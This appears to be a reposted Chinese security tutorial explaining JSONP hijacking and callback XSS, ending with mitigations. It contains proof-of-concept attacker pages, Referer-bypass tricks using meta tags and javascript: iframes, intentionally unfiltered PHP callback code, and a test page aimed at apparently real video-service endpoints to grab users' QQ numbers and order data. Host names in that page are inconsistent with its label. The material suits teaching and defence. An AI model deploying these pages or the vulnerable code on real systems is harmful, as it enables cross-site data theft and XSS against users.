#  浅谈JSONP劫持漏洞   
 Ots安全   2024-04-14 15:07  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad3uYaWy3tOJiaS8pSUTcg1QG6GCNUR3C9puRQRiafbOY9QM6wAhWibRqXAnJTib0uH7ib1ZaAibO8YSicOQ/640?wx_fmt=png&from=appmsg "")  
  
**JSONP**  
  
JSONP的全称是JSON with Padding，是一种基于JSON格式来解决跨域请求资源的方案。   
  
  
由于浏览器同源策略的限制，浏览器只允许XmlHttpRequest请求当前相同（域名、协议、端口）的资源，对请求脚本资源没有限制。  
  
  
原理：客户端通过请求脚本标签发送跨域请求，然后服务器输出JSON数据并执行回调函数。这种跨域数据输出方式称为JSONP。简单原理说明：使用<script></script>  
  
  
可能造成的危险   
- JSONP数据劫持   
  
- 没有过滤导致的回调xss  
  
**JSONP 劫持示例**  
```
# Server request address: http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback
<?php
header('Content-type: application/json');
$callback = htmlspecialchars($_REQUEST['callback']);
if (!isset($callback) || empty($callback)) {
    $callback = 'callback';
}
$data = array('username'=>'Pmeow-phpoop','email' => '3303003493@google.com');
$json = json_encode($data);
echo $callback."(".$json.")";
```  
```
# Client request address: http://127.0.0.1/jsonp/jsonp_test.html
<!DOCTYPE html>
<html lang='en'>
<head>
    <title>jsonp</title>
</head>
<body>
    jsonp hijack test
</body>
    <script>
        function jsonCallback(data){
            alert(JSON.stringify(data));
        }
</script>
    <script src="http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback"></script>
</html>
```  
  
**JSONP劫持绕过方法**  
  
**Referer过滤（常规）不严格**  
  
例如http://aphp.test/jsonp/test_jsonp.php？callback=jsonCallback 输出数据时，验证Referer  
  
  
但不幸的是，它只验证关键字 aphp.测试存在于 Referer 中。   
  
那么攻击者就可以构造url：http://127.0.0.1/aphp.test.html或者http://127.0.0.1/attack.htm？aphp.测试   
  
  
构造这样的url发起攻击绕过Referer防御   
  
**空引用绕过**  
  
有时候开发者在过滤的时候会允许Referer来源为空，因为正常情况下浏览器直接访问一个没有Referer的URL，所以我们有时候可以利用这个特性来绕过  
```
# Use the <meta> tag to implement an empty Referer
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta name="referrer" content="never" charset="utf-8">
    <title>jsonp without Referer</title>
</head>
<body>
    jsonp without Referer hijacking test
</body>
    <script>
        function jsonCallback(data){
            alert(JSON.stringify(data));
        }
</script>
    <script src="http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback"></script>
</html>
```  
```
# Use the <iframe> tag to call the javscript pseudo-protocol to implement an empty Referer call JSON file
<!DOCTYPE html>
<html lang='en'>
<head>
    <title>jsonp without Referer</title>
</head>
<body>
    jsonp without Referer hijacking test
</body>
    <iframe src="javascript:'<script>function jsonCallback(data){alert(JSON.stringify(data));}</script> <script src=http://aphp.test/jsonp/test_jsonp.php? callback=jsonCallback></script>'" frameborder="0"></iframe>
</html>
```  
  
**回调可以定义引起的安全问题**  
  
一般开发中，前端可以很方便调用，一般输出Callback都是可定制的，如果过滤不严格，或者Content-Type设置不合适，就会导致xss   
  
注意：严格来说，如果输出数据也是攻击者可控的话，也可能造成危害，但本文强调的是Callback的输出点   
  
测试一段代码如下  
```
<?php
$callback = $_REQUEST['callback'];
if (!isset($callback) || empty($callback)) {
    $callback = 'callback';
}
$data = array('username'=>'Pmeow-phpoop','email' => '3303003493@google.com');
$json = json_encode($data);
echo $callback."(".$json.")";
```  
  
**测试 HTML 代码**  
```
<!DOCTYPE html>
<html lang='en'>

<head>
    <meta name="referrer" content="never" charset="utf-8">
    <title>jsonp hijack</title>
</head>

<body>
    https://v.qq.com jsonp hijacking
</body>
    <!-- Hijacking the user's QQ number can be used for promotion -->
    <script>function jc(data){alert(JSON.stringify(data));}</script>
    <script src="http://node.video.google.com/x/api/get_2029?callback=jc&_=1542534620161"></script>
    
    <!-- Hijack the user's order data -->
    <script>function jc2(data){alert(JSON.stringify(data));}</script>
    <script src="http://like.video.google.com/fcgi-bin/flw_new?otype=json&sn=FollowServer&cmd=2562&pidx=0&size=30&dtype=0&type=0&callback=jc2&_=1542536629083"></script>
</html>
```  
  
**JSONP 修复**  
- 验证 HTTP Referer 标头信息。  
  
- 将 csrfToken 添加到请求中并在后端验证它。  
  
- JSON 格式的标准输出，Content-Type 设置为 (Content-Type : application/json; charset=utf-8)。  
  
- 严格过滤回调函数名和输出的JSON数据（防止xss）  
  
原文地址：  
  
https://tutorialboy24.blogspot.com/2023/07/talking-about-jsonp-hijacking.html  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
